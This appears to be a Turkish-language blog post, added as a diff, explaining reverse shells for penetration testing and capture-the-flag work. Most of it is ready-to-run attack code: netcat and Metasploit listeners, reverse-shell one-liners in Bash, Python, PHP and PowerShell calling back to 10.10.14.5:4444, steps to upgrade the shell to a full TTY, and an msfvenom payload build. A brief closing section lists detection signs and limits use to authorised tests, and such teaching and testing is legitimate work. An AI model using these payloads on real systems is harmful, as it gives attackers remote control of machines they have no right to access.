@@ -1,0 +1,123 @@
+---
+title: "Reverse Shell: Bağlantı Almanın Yolları"
+date: "2026-03-14"
+description: "Pentest ve CTF senaryolarında reverse shell almanın farklı yöntemlerini, payload seçimini ve tespiti zorlaştıran teknikleri inceledim."
+tags: ["Pentest", "CTF"]
+---
+
+## Reverse Shell Nedir?
+
+Normal bir shell bağlantısında saldırgan hedef sisteme bağlanır (bind shell). Reverse shell'de ise hedef sistem **saldırgana** bağlanır. Bu yaklaşım, güvenlik duvarı kurallarını atlatmak için kritik önem taşır — çünkü çoğu firewall gelen bağlantıları filtreler, giden bağlantıları serbest bırakır.
+
+```
+[Hedef] ──── bağlantı kurma ────▶ [Saldırgan:4444]
+```
+
+## Listener Başlatma
+
+Payload çalıştırmadan önce kendi makinenizde dinleyiciyi açın:
+
+```bash
+# Netcat ile klasik listener
+nc -lvnp 4444
+
+# Rlwrap ile geliştirme (ok tuşları, history)
+rlwrap nc -lvnp 4444
+
+# Metasploit multi/handler
+msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"
+```
+
+## Payload'lar
+
+### Bash
+
+```bash
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+
+# Alternatif — bazı sistemlerde daha güvenilir
+bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
+```
+
+### Python
+
+```python
+# Python 3
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+
+# Python 2
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+### PHP
+
+```php
+<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
+
+// Daha kapsamlı
+php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### PowerShell (Windows)
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5", 4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | % { 0 }
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    $sendback = (iex $data 2>&1 | Out-String)
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+```
+
+## Shell'i Stabilize Etme
+
+Ham reverse shell'ler genellikle kararsızdır — `CTRL+C` bağlantıyı keser, tab completion çalışmaz. Aşağıdaki adımlarla tam TTY'ye yükseltin:
+
+```bash
+# 1. Adım — hedef makinede
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# 2. Adım — CTRL+Z ile arka plana al, kendi terminalinizde
+stty raw -echo; fg
+
+# 3. Adım — hedef makinede
+export TERM=xterm
+stty rows 38 cols 175
+```
+
+## revshells.com Alternatifi
+
+Hızlı payload üretmek için `revshells.com` pratik olsa da **üretim ortamı IP'lerinizi** üçüncü parti sitelere girmekten kaçının. Bunun yerine:
+
+```bash
+# msfvenom ile özelleştirilmiş payload
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f elf -o shell.elf
+
+chmod +x shell.elf && ./shell.elf
+```
+
+## Tespit ve Savunma
+
+Mavi takım perspektifinden izlenmesi gereken işaretler:
+
+- `/dev/tcp` kullanan bash process'leri
+- Beklenmedik dış bağlantı kuran `python`, `php`, `perl` process'leri
+- Yüksek frekanslı giden bağlantılar (beacon davranışı)
+
+```bash
+# Şüpheli bağlantıları anlık izle
+ss -tnp | grep ESTABLISHED
+
+# Process'in hangi bağlantıları açtığını gör
+lsof -i -n -P | grep "10.10.14"
+```
+
+> **Not:** Bu teknikler yalnızca izinli pentest ortamlarında ve CTF senaryolarında kullanılmalıdır.
